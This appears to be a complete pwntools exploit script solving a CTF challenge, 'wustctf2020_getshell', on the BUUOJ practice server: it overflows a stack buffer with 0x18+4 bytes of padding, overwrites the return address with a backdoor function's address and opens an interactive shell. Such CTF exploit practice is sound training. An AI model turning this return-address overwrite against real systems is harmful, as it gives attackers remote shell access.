from pwn import *
#io = process("./wustctf2020_getshell")
io = remote("node3.buuoj.cn",27728)
back_door = 0x0804851B
payload = 'a'*(0x18+4)+p32(back_door)
io.recv()
io.sendline(payload)
io.interactive()